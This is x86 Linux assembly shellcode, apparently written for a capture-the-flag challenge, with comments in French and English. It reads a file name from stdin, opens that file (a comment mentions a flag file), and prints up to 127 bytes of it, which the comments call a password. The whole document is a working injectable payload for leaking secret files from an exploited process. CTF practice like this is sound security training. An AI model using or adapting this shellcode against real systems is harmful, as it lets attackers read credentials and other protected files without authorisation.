global _start
_start:
xor eax,eax
push eax
mov al,0x3  		;Read Syscall
xor ebx,ebx 		;read on stdin
mov ecx,esp 		;read on stack
push byte 21        ;14 bytes Large for .flag.txt
pop edx					;Get Size to read
int 0x80				

;Deux lignes pas utile si la pile est bien géré
mov [ecx+7],bl  ; on écrase le '\n' du printf
mov [ecx+8],ebx ; On ajout un \0 pour terminer la chaine

xor eax,eax
mov al,0x5			;Open Syscall
mov ebx,ecx			;Point on the stack, file name just read
xor ecx,ecx			;0 for read only
xor edx,edx
int 0x80

mov ebx, eax		;here ebx contains the filehandle (eax from Open Sycall)
xor eax,eax
mov al,0x3			;Read Syscall
mov ecx,esp			;read on the stack e beautiful Buffer
push byte 127
pop edx					;127 bytes is large for a password
int 0x80

xor ebx,ebx
xor eax,eax
mov al,0x4			;Syscall Write See the password on the stack
mov bl,0x1			;Write on stdout , on the consol
								;ecx point on the stack from last syscall ;) 
								;edx have the good size from last syscall ;)
int 0x80

